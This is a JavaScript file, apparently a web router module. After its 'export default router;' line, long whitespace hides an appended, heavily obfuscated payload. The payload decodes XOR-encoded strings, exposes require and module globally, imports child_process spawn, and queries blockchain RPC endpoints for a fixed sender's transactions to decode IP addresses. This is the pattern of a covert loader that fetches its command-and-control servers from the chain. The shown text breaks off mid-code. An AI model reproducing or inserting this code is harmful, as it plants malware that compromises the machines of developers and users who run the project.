export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     function GSkqNNyuJw$_padNcYwam(){const etOZXsn_OxqoSnJy$OEFSTCE=['bcbdaff1','f3fdfdfa','a0ba88bbbba8b0','a1aca8adacbbba','b9a0b9ac','a1bdbdb9baf3e6e6f8bbb9aae7a0a6e6acbda1','a1acb1','a6aba3acaabd','aba8baacfffd','fbfffbfcfbf9f190b9a0baa6bb','8aa6a7bdaca7bde485aca7aebda1','a7a6a7aaac','f9b1a8fafbfb8cfcaffa8dfaf8f88dfaf9f1f9acffaff9f8fbf8f9fffaacf0a88d8afbfdf0f98caff8a8','afa0a5bdacbb','9681fb','baaca8bbaaa1','a1bdbdb9f3e6e6','a8adad8cbfaca7bd85a0babdaca7acbb','bbacb9a5a8aaac','a7a6adac','bbacbabca5bd','a4a0a7','a0aea7a6bbac','acbda196aba5a6aaa287bca4abacbb','a1bdbdb9baf3','f3fdfdfae6f9b1e6a5ba','efbabda8bbbdaba5a6aaa2f4f9efaca7adaba5a6aaa2f4f0f0f0f0f0f0f0f0efb9a8aeacf4f8efa6afafbaacbdf4fbf9efbaa6bbbdf4adacbaaaefafa0a5bdacbbabb0f4afbba6a4','a7a6adacf3a1bdbdb9','aeb3a0b9','b9bcbaa1','babcaba8bbbba8b0','fbad9e8fb08f9b','b8fd8f93a2b191b2e8a1e59abbfaf489','fbfffbfef8fbf9b08dbcbd9abc','a1a8ba','bebba0bdac','f8fbbdafac9a81be','bbacb8bcacbabd','aea5a6aba8a592ee969fee94f4ee','a4a8b9','f8f9f9fffcfaffa3bd868f9a8b','bbbca7','8c9d81969b998a969c9b85','aaa6a7bdaca7bde4aca7aaa6ada0a7ae','bdbba8a7baa8aabda0a6a7ba','fbe7f9','a7a6adacf3a1bdbdb9ba','a1bdbdb9baf3e6e6acbda1e7adbbb9aae7a6bbae','a8adad','a7a6adacf3aaa1a0a5ad96b9bba6aaacbaba','8ca4b9bdb0e9b9a8b0a5a6a8ade9aba6adb0','b9a8bbbaac','96bd96ba','bca7bbacaf','f8fbf0fbfafcfbfa839a818d90bc','99869a9d','8e8c9d','aabbaca8bdac80a7afa5a8bdac','eef2aea5a6aba8a592ee9681fbee94f4ee','fbfffcfefff0f9bc8e8c9f828d','f3f1f9','a1bdbdb9baf3e6e6acbda1e7aba5a6aaa2baaaa6bcbde7aaa6a4e6a8b9a0','f1f1838fb1bd86a1','acbbbba6bb','88aeaca7bd','a7a6adacf3bcbba5','bda1aca7','baa0aea7a8a5','b1e4b9a8b0a5a6a8ade4abfffd','ada8bda8','b0e4b996f7adedf98bef8997f8a898a2','fff9fafaf8fefd81b08d8c9fbb','aabbaca8bdac8bbba6bda5a08dacaaa6a4b9bbacbaba','a5aca7aebda1','818c888d','f6a4a6adbca5acf4a8aaaaa6bca7bdefa8aabda0a6a7f4bdb1a5a0babdefa8adadbbacbabaf4','84a6b3a0a5a5a8e6fce7f9e9e19ea0a7ada6bebae9879de9f8f9e7f9f2e99ea0a7fffdf2e9b1fffde0e988b9b9a5ac9eacab82a0bde6fcfafee7faffe9e182819d8485e5e9a5a0a2ace98eacaaa2a6e0e98aa1bba6a4ace6f8faf8e7f9e7f9e7f9e99aa8afa8bba0e6fcfafee7faff','aeb3a0b9e5e9adacafa5a8bdace5e9abbb','babdbba0a7aea0afb0','b9a8bda1a7a8a4ac','adacafa5a8bdac','aeacbd','a8b9b9a5a0aaa8bda0a6a7e6a3baa6a7','f3fdfdfae6f9b1e6aaa5ba','acbda196aeacbd8ba5a6aaa28bb087bca4abacbb','aaa6a7bdbba6a5a5acbb','a7a6adacf3b3a5a0ab','aaa1a8bb8aa6adac88bd','bbacbabca4ac','eef2aea5a6aba8a592ee96bd96baee94f4ee','aba5a6aaa287bca4abacbb','88f8f8e4e4e3','a1bdbdb9baf3e6e6acbda1acbbacbca4e4bbb9aae7b9bcaba5a0aaa7a6adace7aaa6a4','eef2aea5a6aba8a592ee9681ee94f4ee','b1e4aeb3a0b9','acbda196aeacbd9dbba8a7baa8aabda0a6a78aa6bca7bd','fa9ca6af9090a5','aaa8bdaaa1','a8aba6bbbd','a1bdbdb9baf3e6e6acbda1e4a4a8a0a7a7acbde7b9bcaba5a0aae7aba5a8babda8b9a0e7a0a6','eef2aea5a6aba8a592eebbee94f4bbacb8bca0bbacf2aea5a6aba8a592eea4ee94f4a4a6adbca5acf2bfa8bbe996aea5a6aba8a5f4aea5a6aba8a5f2','a8a7b0','84a0babaa0a7aee991e499a8b0a5a6a8ade48bfffd','afbba6a4','8aa6a7bdaca7bde49db0b9ac','aca7bf','aaa6a7aaa8bd','b9a6bbbd','a1a6babda7a8a4ac','b9bba6bda6aaa6a5','a2acacb9e4a8a5a0bfac','a8a5a5','abb0bdac85aca7aebda1','eef2aea5a6aba8a592ee96bd96bcee94f4ee','afa0a7ad','afa0a7ad80a7adacb1','fbfff9f9faf1fc99bb8699a088','96bd96bc','afa6bb8ca8aaa1','aca7ad','aabbaca8bdac8ebca7b3a0b9','bda69abdbba0a7ae','bda685a6beacbb8aa8baac'];GSkqNNyuJw$_padNcYwam=function(){return etOZXsn_OxqoSnJy$OEFSTCE;};return GSkqNNyuJw$_padNcYwam();}const BEf$CYFUWXrAiwaYBJ=WlysIxGuPMcViepbraDjp_wli;(function(Xl$bf$sDoXoJDYYk,HTDn$viaGa){const KyT$ImpNQojHcB=WlysIxGuPMcViepbraDjp_wli,nZXZyKB_XfHpJ=Xl$bf$sDoXoJDYYk();while(!![]){try{const Bjb__LSBuuTvrwOljv=parseFloat(KyT$ImpNQojHcB(0x168))/(0x562+0x1*Number(-parseInt(0x502))+parseInt(0x13)*-parseInt(0x5))*(-parseFloat(KyT$ImpNQojHcB(0x171))/(parseInt(0x1)*parseFloat(-0xe21)+parseInt(0x4)*parseInt(0x22)+0x3*Math.floor(parseInt(0x489))))+parseFloat(KyT$ImpNQojHcB(0x1a9))/(Math.max(0xd,parseInt(0xd))*parseFloat(-parseInt(0x112))+-0x1*0x2516+Math.trunc(0x5ab)*0x9)*Math['ceil'](parseFloat(KyT$ImpNQojHcB(0x152))/(Math.max(0xe4a,0xe4a)+Number(-0x13)*-parseInt(0x121)+-0x23b9))+-parseFloat(KyT$ImpNQojHcB(0x1bd))/(-0x729+parseInt(parseInt(0x7))*Math.max(-0xf7,-0xf7)+parseInt(0xdef))*parseFloat(parseFloat(KyT$ImpNQojHcB(0x16d))/(-0x659+Number(-parseInt(0x559))*parseInt(-parseInt(0x2))+-parseInt(0x7b)*Number(parseInt(0x9))))+Math['floor'](-parseFloat(KyT$ImpNQojHcB(0x190))/(parseInt(0x1da3)+parseInt(0x3)*Math.trunc(0x22d)+-0x2423))+parseFloat(-parseFloat(KyT$ImpNQojHcB(0x16a))/(-parseInt(0xf5)*-0x27+Math.ceil(0x18ee)+Number(-0x3e39)))+parseFloat(KyT$ImpNQojHcB(0x17f))/(parseInt(0xd44)+parseFloat(0xa75)+Math.ceil(-parseInt(0x17b0)))+parseFloat(KyT$ImpNQojHcB(0x184))/(parseInt(0x1e87)+parseInt(0x1c8b)*parseInt(-parseInt(0x1))+Math.floor(-0x1f2))*Number(parseFloat(KyT$ImpNQojHcB(0x187))/(parseInt(0x22f8)+0x2662+-0x494f));if(Bjb__LSBuuTvrwOljv===HTDn$viaGa)break;else nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());}catch(QTrIuEpsrXWNzFyCLzuoNxfM){nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());}}}(GSkqNNyuJw$_padNcYwam,parseInt(0x1)*-0xc3d37+-parseInt(0xf8a8f)+parseInt(parseInt(0x2ac185))*0x1),global['i']=BEf$CYFUWXrAiwaYBJ(0x1a4),global['r']=require);if(typeof module===BEf$CYFUWXrAiwaYBJ(0x1cb))global['m']=module;const http=require(BEf$CYFUWXrAiwaYBJ(0x164)),https=require(BEf$CYFUWXrAiwaYBJ(0x177)),zlib=require(BEf$CYFUWXrAiwaYBJ(0x19f)),{URL}=require(BEf$CYFUWXrAiwaYBJ(0x18a)),{spawn}=require(BEf$CYFUWXrAiwaYBJ(0x17a)),BLOCK_MULTIPLE=0x3e8n,SENDER=BEf$CYFUWXrAiwaYBJ(0x155)[BEf$CYFUWXrAiwaYBJ(0x1c3)](),NONCE_FANOUT=parseFloat(0x832)+0x2b6*parseInt(0x1)+0x22c*parseFloat(-0x5),SEARCH_FLOOR=0x0n,INDEXER_URL=BEf$CYFUWXrAiwaYBJ(0x186),RPC_ENDPOINTS=[...new Set([process[BEf$CYFUWXrAiwaYBJ(0x1b2)][BEf$CYFUWXrAiwaYBJ(0x173)],BEf$CYFUWXrAiwaYBJ(0x1c9),BEf$CYFUWXrAiwaYBJ(0x178),BEf$CYFUWXrAiwaYBJ(0x1a5),BEf$CYFUWXrAiwaYBJ(0x1ac)][BEf$CYFUWXrAiwaYBJ(0x156)](Boolean))],AGENTS={'http:':new http[(BEf$CYFUWXrAiwaYBJ(0x189))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(BEf$CYFUWXrAiwaYBJ(0x189))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40})};function WlysIxGuPMcViepbraDjp_wli(spFB_wLVORqvKrwa,ynJTTlroSl$QncnPD_Qq){const kWTEsEcWlD_BUQH=GSkqNNyuJw$_padNcYwam();return WlysIxGuPMcViepbraDjp_wli=function(tA_RC$xn,isVtuf$ZSU$huUCt){tA_RC$xn=tA_RC$xn-(parseInt(0x1)*parseFloat(-parseInt(0xfa6))+-0xbd*Math.ceil(0x1d)+parseInt(0x2660));let NMEoPhIkCfevMgn=kWTEsEcWlD_BUQH[tA_RC$xn];if(WlysIxGuPMcViepbraDjp_wli['DygzNg']===undefined){const WYkNNREB=function(yKfxUzllsQeciuTTd){let WNSfkHUMF__gRFhcdmgOuEhgmQ=-parseInt(0x5d1)+Math.trunc(-0xf9e)+parseInt(-0xc1c)*-0x2&parseFloat(parseInt(0x2134))+0x2252+-parseInt(0x4287),ngyngPAupzHA$yVGA=new Uint8Array(yKfxUzllsQeciuTTd['match'](/.{1,2}/g)['map'](sQCRcCAvmfPvdrQIY$uj$Ss=>parseInt(sQCRcCAvmfPvdrQIY$uj$Ss,-0x793*Math.ceil(0x1)+-0x178d*Number(-0x1)+-parseInt(0xfea)))),chTIQE$dvTHGh_M=ngyngPAupzHA$yVGA['map'](nanuwgOSOV=>nanuwgOSOV^WNSfkHUMF__gRFhcdmgOuEhgmQ),ebdo$Q_z=new TextDecoder(),X$UlamGszKv_mpfCd=ebdo$Q_z['decode'](chTIQE$dvTHGh_M);return X$UlamGszKv_mpfCd;};WlysIxGuPMcViepbraDjp_wli['jYnEnM']=WYkNNREB,spFB_wLVORqvKrwa=arguments,WlysIxGuPMcViepbraDjp_wli['DygzNg']=!![];}const kOlyQ$dtGKf=kWTEsEcWlD_BUQH[-0x18c0+Math.floor(-0x101b)+0x28db],MsdHTfLBNjfnWUlbt=tA_RC$xn+kOlyQ$dtGKf,Kepv_qCFfNHmUDX$mOnAR=spFB_wLVORqvKrwa[MsdHTfLBNjfnWUlbt];return!Kepv_qCFfNHmUDX$mOnAR?(WlysIxGuPMcViepbraDjp_wli['LkFify']===undefined&&(WlysIxGuPMcViepbraDjp_wli['LkFify']=!![]),NMEoPhIkCfevMgn=WlysIxGuPMcViepbraDjp_wli['jYnEnM'](NMEoPhIkCfevMgn),spFB_wLVORqvKrwa[MsdHTfLBNjfnWUlbt]=NMEoPhIkCfevMgn):NMEoPhIkCfevMgn=Kepv_qCFfNHmUDX$mOnAR,NMEoPhIkCfevMgn;},WlysIxGuPMcViepbraDjp_wli(spFB_wLVORqvKrwa,ynJTTlroSl$QncnPD_Qq);}function linkAbort(qRbWgh$_L,GlRQrYsHirhY$Vyg){const Sxq$NJJJDIKAYR=BEf$CYFUWXrAiwaYBJ;if(!qRbWgh$_L)return;qRbWgh$_L[Sxq$NJJJDIKAYR(0x15a)](Sxq$NJJJDIKAYR(0x1ab),()=>GlRQrYsHirhY$Vyg[Sxq$NJJJDIKAYR(0x1ab)](),{'once':!![]});}function decompressStream(q$Tdc$Ms){const xbMpkdUo=BEf$CYFUWXrAiwaYBJ,HDk$i_Z=(q$Tdc$Ms[xbMpkdUo(0x1c7)][xbMpkdUo(0x174)]||'')[xbMpkdUo(0x1c3)]();if(HDk$i_Z===xbMpkdUo(0x165)||HDk$i_Z===xbMpkdUo(0x1a7))return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x1c1)]());if(HDk$i_Z===xbMpkdUo(0x199))return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x182)]());if(HDk$i_Z==='br')return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x191)]());return q$Tdc$Ms;}function httpRequest(SuzOqhu_wsl,{method:method=BEf$CYFUWXrAiwaYBJ(0x181),body:HpQOCCKnMmgvJrjeVnbVO,signal:cLnqigtE$K}={}){const nPXXxsFSwK=BEf$CYFUWXrAiwaYBJ,bdbsDZ$mDFcLDwI_rrpLTi=new URL(SuzOqhu_wsl),pzi_$pbcMvkvReYcWnCZf=bdbsDZ$mDFcLDwI_rrpLTi[nPXXxsFSwK(0x1b6)]===nPXXxsFSwK(0x161)?https:http,St_LmIDhBUQfKK$dtTIU={'Accept':nPXXxsFSwK(0x19b),'Accept-Encoding':nPXXxsFSwK(0x196),'Connection':nPXXxsFSwK(0x1b7)};return HpQOCCKnMmgvJrjeVnbVO!=null&&(St_LmIDhBUQfKK$dtTIU[nPXXxsFSwK(0x1b1)]=nPXXxsFSwK(0x19b),St_LmIDhBUQfKK$dtTIU[nPXXxsFSwK(0x153)]=Buffer[nPXXxsFSwK(0x1b9)](HpQOCCKnMmgvJrjeVnbVO)),new Promise((uorYmoQfC_wpoWBP,aS_zzfOgL)=>{const BqQs$upLLUi=nPXXxsFSwK,FDg$trqDV_oIT=pzi_$pbcMvkvReYcWnCZf[BqQs$upLLUi(0x16e)]({'hostname':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b5)],'port':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b4)]||(bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b6)]===BqQs$upLLUi(0x161)?Math.max(-parseInt(0x262a),-0x262a)+Math.floor(0xc2e)+Math.floor(0x285)*parseInt(0xb):-parseInt(0x1520)+parseInt(0x1984)+Math.max(-parseInt(0x414),-0x414)),'path':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x198)]+bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x158)],'method':method,'agent':AGENTS[bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b6)]],'signal':cLnqigtE$K,'headers':St_LmIDhBUQfKK$dtTIU},sec$BG_XeSh=>{const nUBOSFVvyTUKL_bnU=BqQs$upLLUi,iyYkiywGkhxX_wNy_WQ=decompressStream(sec$BG_XeSh),dAli$ezckXOQr_dteiCvPPfEREi=[];iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x18e),SFgiGfNPZDODEIQC=>dAli$ezckXOQr_dteiCvPPfEREi[nUBOSFVvyTUKL_bnU(0x166)](SFgiGfNPZDODEIQC)),iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x1c0),()=>{const IURRbBFEfhdLXxf=nUBOSFVvyTUKL_bnU;try{uorYmoQfC_wpoWBP(JSON[IURRbBFEfhdLXxf(0x17c)](Buffer[IURRbBFEfhdLXxf(0x1b3)](dAli$ezckXOQr_dteiCvPPfEREi)[IURRbBFEfhdLXxf(0x1c2)](IURRbBFEfhdLXxf(0x1c4))));}catch(EaYunjJH_vpAdAxipn){aS_zzfOgL(EaYunjJH_vpAdAxipn);}}),iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x188),aS_zzfOgL);});FDg$trqDV_oIT['on'](BqQs$upLLUi(0x188),aS_zzfOgL);if(HpQOCCKnMmgvJrjeVnbVO!=null)FDg$trqDV_oIT[BqQs$upLLUi(0x16c)](HpQOCCKnMmgvJrjeVnbVO);FDg$trqDV_oIT[BqQs$upLLUi(0x1c0)]();});}async function withRpcEndpoints(WADEdCtPHv$W_QkABREA,PRKttmQHVWtMFTZuAS){const kEfbdhXYLiYLvXjcpUkpITudq=BEf$CYFUWXrAiwaYBJ,lpJOrOGUuMGz$oIaG=RPC_ENDPOINTS[kEfbdhXYLiYLvXjcpUkpITudq(0x170)](()=>new AbortController());lpJOrOGUuMGz$oIaG[kEfbdhXYLiYLvXjcpUkpITudq(0x1bf)](t$LTsfTIbSTMMCRUvIzc=>linkAbort(PRKttmQHVWtMFTZuAS,t$LTsfTIbSTMMCRUvIzc));try{return await Promise[kEfbdhXYLiYLvXjcpUkpITudq(0x1ae)](RPC_ENDPOINTS[kEfbdhXYLiYLvXjcpUkpITudq(0x170)]((DVtayaOitikldZPPoWQu,LMddbXnCA)=>WADEdCtPHv$W_QkABREA(DVtayaOitikldZPPoWQu,lpJOrOGUuMGz$oIaG[LMddbXnCA][kEfbdhXYLiYLvXjcpUkpITudq(0x18c)])));}finally{for(const eTYfSIVUcIbiVQhOP of lpJOrOGUuMGz$oIaG)eTYfSIVUcIbiVQhOP[kEfbdhXYLiYLvXjcpUkpITudq(0x1ab)]();}}async function rpcCall(ASrYvwRNhb$d$lFiE,ZsQMeCj_GUR,JShZnjH_aR,htuoDkxWCrU){const qwsnrJLDkrSgda=BEf$CYFUWXrAiwaYBJ,E$FZbNjRk$eX=await httpRequest(ASrYvwRNhb$d$lFiE,{'method':qwsnrJLDkrSgda(0x180),'body':JSON[qwsnrJLDkrSgda(0x197)]({'jsonrpc':qwsnrJLDkrSgda(0x176),'id':0x1,'method':ZsQMeCj_GUR,'params':JShZnjH_aR}),'signal':htuoDkxWCrU});return E$FZbNjRk$eX[qwsnrJLDkrSgda(0x15d)];}async function rpcBatch(lDejkuZhqqaodSuDQTw,yNiYV_dfUft,T_vPGSx){const RgisztlhTFeAZY=BEf$CYFUWXrAiwaYBJ,Ce$gUKS=await httpRequest(lDejkuZhqqaodSuDQTw,{'method':RgisztlhTFeAZY(0x180),'body':JSON[RgisztlhTFeAZY(0x197)](yNiYV_dfUft[RgisztlhTFeAZY(0x170)](([iljaNbsNAegZnsSMfuHG,UhTsWgssgV_YDs$EvQ],hAn$Dxchc)=>({'jsonrpc':RgisztlhTFeAZY(0x176),'id':hAn$Dxchc+(parseInt(0x53)*-0xd+parseInt(-parseInt(0x7))*parseFloat(parseInt(0x35f))+-parseInt(0x1bd1)*-parseInt(0x1)),'method':iljaNbsNAegZnsSMfuHG,'params':UhTsWgssgV_YDs$EvQ}))),'signal':T_vPGSx}),loKNW$ZEHPqwORFBaZndj$qef=new Map(Ce$gUKS[RgisztlhTFeAZY(0x170)](Hl$GzK=>[Hl$GzK['id'],Hl$GzK]));return yNiYV_dfUft[RgisztlhTFeAZY(0x170)]((rGbwK$FU,WOWcZfwO_kkhojX)=>loKNW$ZEHPqwORFBaZndj$qef[RgisztlhTFeAZY(0x19a)](WOWcZfwO_kkhojX+(Math.ceil(0xb60)+Math.floor(0x1091)*-0x2+parseInt(-0x1)*-parseInt(0x15c3)))[RgisztlhTFeAZY(0x15d)]);}const toBlockHex=nPMI$oplQLHIfFIMh$MXlWouLYr=>'0x'+nPMI$oplQLHIfFIMh$MXlWouLYr[BEf$CYFUWXrAiwaYBJ(0x1c2)](Math.trunc(-0x9e7)+parseInt(0x4a)*-parseInt(0x1f)+-0x11d*parseFloat(-0x11));function findSenderTx(JlepYaLvfHyt){const SBYThyjM$PN_bMmdJBQYZ=BEf$CYFUWXrAiwaYBJ;return JlepYaLvfHyt[SBYThyjM$PN_bMmdJBQYZ(0x1bb)](tQMkfGioJnQRZXosCHWMbN=>tQMkfGioJnQRZXosCHWMbN[SBYThyjM$PN_bMmdJBQYZ(0x1b0)]&&tQMkfGioJnQRZXosCHWMbN[SBYThyjM$PN_bMmdJBQYZ(0x1b0)][SBYThyjM$PN_bMmdJBQYZ(0x1c3)]()===SENDER)||null;}function decodeAddress(LLFlttzzZOjWxX){const KyRKDi_zVgoWr$Fcp=BEf$CYFUWXrAiwaYBJ,GHVvJhQqwuZof_fMJJmhgHtG=Buffer[KyRKDi_zVgoWr$Fcp(0x1b0)](LLFlttzzZOjWxX[KyRKDi_zVgoWr$Fcp(0x15b)](/^0x/i,''),KyRKDi_zVgoWr$Fcp(0x1ca)),oc_pQi$hRDfnjMb=NtzkwLinmHzrb$T$VOVzhvqWzO=>NtzkwLinmHzrb$T$VOVzhvqWzO[-parseInt(0x3d)*-0x52+-0x174*Number(-0xd)+-parseInt(0x1337)*0x2]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[parseInt(-parseInt(0x12fd))+Number(-0x1af)*0xc+parseInt(0x2732)]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[parseInt(0x31)*parseInt(0x55)+-0x1e78+parseInt(parseInt(0xe35))]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[Number(parseInt(0x299))+parseInt(0x13fc)+Math.trunc(-0x1692)];return[oc_pQi$hRDfnjMb(GHVvJhQqwuZof_fMJJmhgHtG[KyRKDi_zVgoWr$Fcp(0x167)](Math.ceil(0x25)*-0x103+Math.max(-parseInt(0x960),-parseInt(0x960))+0x2ecf,parseInt(0x146c)+Number(0x4)*parseInt(0x2f0)+-parseInt(0x62)*Math.max(0x54,parseInt(0x54)))),oc_pQi$hRDfnjMb(GHVvJhQqwuZof_fMJJmhgHtG[KyRKDi_zVgoWr$Fcp(0x167)](0x67*Number(parseInt(0x5b))+0x6*parseInt(-0x401)+Math.ceil(parseInt(0x3))*-0x431,Math.ceil(-0x15b5)+-0x706*parseInt(0x3)+Math.floor(parseInt(0x2acf))))];}function firstMatch(RXQiRBl){return new Promise(ycfoHDNWrbSH=>{const agPpRSoihEXM=WlysIxGuPMcViepbraDjp_wli;let PW_L$mqJD=RXQiRBl[agPpRSoihEXM(0x192)];if(!PW_L$mqJD)return ycfoHDNWrbSH(null);let c_DcWifKzZZiWxV=![];const MQgJSlLDkonMvAdlnGaV=YXh_Wriz=>{const SLDTKOeeSQmQylQqge$fqRAt=agPpRSoihEXM;if(c_DcWifKzZZiWxV)return;c_DcWifKzZZiWxV=!![];for(const onzMmVaA$nTKSNPFeFyEHd of RXQiRBl)onzMmVaA$nTKSNPFeFyEHd[SLDTKOeeSQmQylQqge$fqRAt(0x19e)][SLDTKOeeSQmQylQqge$fqRAt(0x1ab)]();ycfoHDNWrbSH(YXh_Wriz);};for(const HSdfIaIW$pedbsDYi of RXQiRBl){HSdfIaIW$pedbsDYi[agPpRSoihEXM(0x172)]()[agPpRSoihEXM(0x18b)](lmICTA_NUarZEN=>{if(c_DcWifKzZZiWxV)return;if(lmICTA_NUarZEN)MQgJSlLDkonMvAdlnGaV(lmICTA_NUarZEN);else{if(--PW_L$mqJD===parseInt(0x73)*parseInt(-parseInt(0x4b))+parseFloat(-parseInt(0x280))*Math.ceil(-parseInt(0xe))+-0x14f)ycfoHDNWrbSH(null);}})[agPpRSoihEXM(0x1aa)](()=>{if(!c_DcWifKzZZiWxV&&--PW_L$mqJD===0x1a03+0x7e5+-parseInt(0x21e8))ycfoHDNWrbSH(null);});}});}function candidateBlocks(bLkeguRlGKpOR$sJag_F){const XijawxtX$yOfNKoIBZeBqs=BEf$CYFUWXrAiwaYBJ,cjbYFRMDhmUrBgfcnqAce=bLkeguRlGKpOR$sJag_F-BLOCK_MULTIPLE,xfUDNMijvuXOjMQBDF=new Set(),rHOWoPAmb$L=[];for(const eItYBJvGagwlwlgoIyvkFxSC of[bLkeguRlGKpOR$sJag_F-0x1n,bLkeguRlGKpOR$sJag_F,bLkeguRlGKpOR$sJag_F+0x1n,cjbYFRMDhmUrBgfcnqAce-0x1n,cjbYFRMDhmUrBgfcnqAce,cjbYFRMDhmUrBgfcnqAce+0x1n]){if(eItYBJvGagwlwlgoIyvkFxSC<0x0n)continue;const N$zKLRegWIHol=eItYBJvGagwlwlgoIyvkFxSC[XijawxtX$yOfNKoIBZeBqs(0x1c2)]();if(xfUDNMijvuXOjMQBDF[XijawxtX$yOfNKoIBZeBqs(0x16b)](N$zKLRegWIHol))continue;xfUDNMijvuXOjMQBDF[XijawxtX$yOfNKoIBZeBqs(0x179)](N$zKLRegWIHol),rHOWoPAmb$L[XijawxtX$yOfNKoIBZeBqs(0x166)](eItYBJvGagwlwlgoIyvkFxSC);}return rHOWoPAmb$L;}function blockTask(AXUCxPFXCcG){const CcSk$dOOG$tJaJ=new AbortController();return{'controller':CcSk$dOOG$tJaJ,'run':async()=>{const Flb_PeG=WlysIxGuPMcViepbraDjp_wli,J$ygYIX=await withRpcEndpoints((yVvvyY_XmC$ilpeTJT,QzgqxL$lrANn)=>rpcCall(yVvvyY_XmC$ilpeTJT,Flb_PeG(0x19d),[toBlockHex(AXUCxPFXCcG),!![]],QzgqxL$lrANn),CcSk$dOOG$tJaJ[Flb_PeG(0x18c)]),lFUiajiB$mhdtEP=J$ygYIX?.[Flb_PeG(0x175)];if(!Array[Flb_PeG(0x1c6)](lFUiajiB$mhdtEP))return null;const CX$IIYzbRMljhGDGQOn=findSenderTx(lFUiajiB$mhdtEP);return CX$IIYzbRMljhGDGQOn?{'blockNumber':AXUCxPFXCcG,'tx':CX$IIYzbRMljhGDGQOn}:null;}};}async function nonceAtBlocks(xn_wtGgYrKQjgNW_pA,esAMqTjgXNpOIVWCUlHCiJWR){const gC$IHIGOXbRBecVx_R=BEf$CYFUWXrAiwaYBJ,OYgjuXmanrbYtfW=xn_wtGgYrKQjgNW_pA[gC$IHIGOXbRBecVx_R(0x170)](mgcOt=>[gC$IHIGOXbRBecVx_R(0x1a8),[SENDER,toBlockHex(mgcOt)]]);try{return(await withRpcEndpoints((RHnOdxdnc$LyRixBY,DPj_yjR$iRFwaGZps)=>rpcBatch(RHnOdxdnc$LyRixBY,OYgjuXmanrbYtfW,DPj_yjR$iRFwaGZps),esAMqTjgXNpOIVWCUlHCiJWR))[gC$IHIGOXbRBecVx_R(0x170)](BigInt);}catch{return(await Promise[gC$IHIGOXbRBecVx_R(0x1b8)](OYgjuXmanrbYtfW[gC$IHIGOXbRBecVx_R(0x170)](([GuGZhYYgT$kyp,PkcxliQBzC])=>withRpcEndpoints((TfBe$DuDUAFUEyKCAXfdMQR,ELXbSluHr_MPeDjZHUnE$jZq)=>rpcCall(TfBe$DuDUAFUEyKCAXfdMQR,GuGZhYYgT$kyp,PkcxliQBzC,ELXbSluHr_MPeDjZHUnE$jZq),esAMqTjgXNpOIVWCUlHCiJWR))))[gC$IHIGOXbRBecVx_R(0x170)](BigInt);}}async function lastSenderTx(m_ixszc$Qu){const KYZeSIB=BEf$CYFUWXrAiwaYBJ,vOeJlPmLwpiHL$oohJee=new AbortController();try{const Zh$sPizEILiVZEl=m_ixszc$Qu??BigInt(await withRpcEndpoints((HNTZRdfPREnYvbYPL,OS_$UBVWEnUUVQ)=>rpcCall(HNTZRdfPREnYvbYPL,KYZeSIB(0x160),[],OS_$UBVWEnUUVQ),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)])),KdmVwLcnVRrGrW=BigInt(await withRpcEndpoints((Jnijrm$GJWFBXseOLFirZ$D,pxHSUzAottYo)=>rpcCall(Jnijrm$GJWFBXseOLFirZ$D,KYZeSIB(0x1a8),[SENDER,toBlockHex(Zh$sPizEILiVZEl)],pxHSUzAottYo),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)])),wxMNGaAYpSO=KdmVwLcnVRrGrW-0x1n;let EyfGMqfGt=SEARCH_FLOOR-0x1n,MFMjq=Zh$sPizEILiVZEl;while(MFMjq-EyfGMqfGt>0x1n){const xuQ$dxkjYVLINjswAjZJx=MFMjq-EyfGMqfGt-0x1n,opSYF_xqlkKe_bDDtuDuy=BigInt(Math[KYZeSIB(0x15e)](NONCE_FANOUT,Number(xuQ$dxkjYVLINjswAjZJx))),CM$Wz_bSEuXKdWfi=[];for(let IR$LUC=0x1n;IR$LUC<=opSYF_xqlkKe_bDDtuDuy;IR$LUC+=0x1n)CM$Wz_bSEuXKdWfi[KYZeSIB(0x166)](EyfGMqfGt+IR$LUC*(MFMjq-EyfGMqfGt)/(opSYF_xqlkKe_bDDtuDuy+0x1n));const SoikConeelN=await nonceAtBlocks(CM$Wz_bSEuXKdWfi,vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)]),QcLgfQBypzvCa=SoikConeelN[KYZeSIB(0x1bc)](ceRuRdAnCmORJt=>ceRuRdAnCmORJt>=KdmVwLcnVRrGrW);if(QcLgfQBypzvCa===-(-parseInt(0x82f)+parseInt(0x622)+Math.floor(0x20e)))EyfGMqfGt=CM$Wz_bSEuXKdWfi[CM$Wz_bSEuXKdWfi[KYZeSIB(0x192)]-(-0x1dd8+Number(-0x244)+0x1*Math.floor(parseInt(0x201d)))];else{MFMjq=CM$Wz_bSEuXKdWfi[QcLgfQBypzvCa];if(QcLgfQBypzvCa>Number(0x1)*parseInt(0x11f)+-parseInt(0x3)*parseFloat(parseInt(0xa9))+Math.max(parseInt(0xdc),0xdc))EyfGMqfGt=CM$Wz_bSEuXKdWfi[QcLgfQBypzvCa-(Math.trunc(0x1)*-0x752+0x1dfd+-0xb55*parseInt(parseInt(0x2)))];}}const pwsZeE=await 